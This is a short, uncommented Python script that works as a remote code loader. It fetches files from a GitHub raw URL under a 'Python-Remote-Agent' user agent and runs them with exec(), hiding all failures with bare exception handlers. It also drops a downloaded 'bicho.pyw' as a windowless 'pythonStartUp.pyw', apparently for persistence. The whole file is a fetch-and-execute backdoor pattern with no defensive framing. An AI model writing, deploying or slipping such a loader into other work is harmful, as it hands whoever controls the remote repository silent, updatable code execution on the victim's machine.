from urllib.request import *
from time import *
import os

ver = 0

user = 'yarnayGH'
repo = 'bichoDataBase'
branch = 'main'
file = '1bach_c.py'
# a ver
def check(file=file):
    try:
        return urlopen(
            Request(
                (f'https://raw.githubusercontent.com/{user}/{repo}/{branch}/{file}'),
                headers={'User-Agent': 'Python-Remote-Agent'}
            ),
            timeout=15
        ).read().decode('utf-8')
    except:
        return ''

def run(file=file):
    try:
        exec(check(file))
    except:
        pass

if check('ver')!=ver and check('ver')!='':
    open(
        os.path.dirname(os.path.abspath(__file__))+'/pythonStartUp.pyw', 'w'
    ).write(
        check('bicho.pyw')
    )

run('general.py')
run()
